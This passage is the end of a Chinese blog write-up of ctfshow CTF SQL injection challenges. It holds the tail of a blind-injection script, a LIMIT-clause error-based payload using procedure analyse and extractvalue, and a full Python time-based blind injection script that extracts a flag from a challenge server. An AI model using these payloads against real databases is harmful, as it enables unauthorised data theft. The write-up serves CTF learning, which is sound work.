class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>到这边盲注就结束了，略感疲惫。</p>
<h2 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h2><p>limit注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = select * <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-title function_ invoke__">limit</span> (<span class="hljs-variable">$page</span>-<span class="hljs-number">1</span>)*<span class="hljs-variable">$limit</span>,<span class="hljs-variable">$limit</span>;<br></code></pre></td></tr></table></figure>

<p>放个p神的文章，可以了解一下具体内容<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysql下Limit注入方法)</a>，在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的，这里利用procedure和analyse两个函数一齐食用，同时利用报错注入</p>
<p>在&#x2F;api下进行get发包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?page=1&amp;<span class="hljs-built_in">limit</span>=1 procedure analyse(extractvalue(1,concat(0x7e,database())),1)<br></code></pre></td></tr></table></figure>

<p>得到的数据库名就是flag直接交就行</p>
<h2 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = select * <span class="hljs-keyword">from</span> ctfshow_user group by <span class="hljs-variable">$username</span>;<br></code></pre></td></tr></table></figure>

<p>研究一下y4师傅的脚本，也是用二分法写的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://fd01f201-a270-4d94-99b1-e530d1e1cdfb.challenge.ctf.show/api/&quot;</span><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i += <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 二分法进行查找</span><br>        <span class="hljs-comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>        <span class="hljs-comment">#payload = &quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;limit 1,1&quot;</span><br>        payload = <span class="hljs-string">&quot;select flagaabc from ctfshow_flaga&quot;</span><br>        params = &#123;<br>            <span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-string">f&quot;concat((if (ascii(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>, sleep(0.05), 2)), 1);&quot;</span><br>        &#125;<br><br>        <span class="hljs-keyword">try</span>:<br>            r = requests.get(url, params=params, timeout=<span class="hljs-number">1</span>)<br>            tail = mid<br>        <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>            head = mid + <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>

<p>利用不断的比较大小，拼接得到flag，可能会有细小误差，手动调节就行</p>
<hr>
<p>X1r0z师傅真的神！y4师傅真的神！看师傅的博客学到了很多</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" class="category-chain-item">每日一题</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/sql%E6%B3%A8%E5%85%A5/" class="print-no-link">#sql注入</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>ctf-sql注入</div>
      <div>https://0ran9ewww.github.io/2024/09/23/每日一题/ctfshow-sql注入/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>orange</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年9月23日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/09/20/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="ctfshow文件上传">
                        <span class="hidden-mobile">ctfshow文件上传</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      

    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  






    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <p>本 blog 由 dkdun 支持</p> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>
 
  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="/js/DynamicLine.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>

<!--浏览器搞笑标题-->
<script type="text/javascript" src="\js\FunnyTitle.js"></script>
<!--鼠标点击礼花特效-->
<script async src="/js/fireworks.js"></script>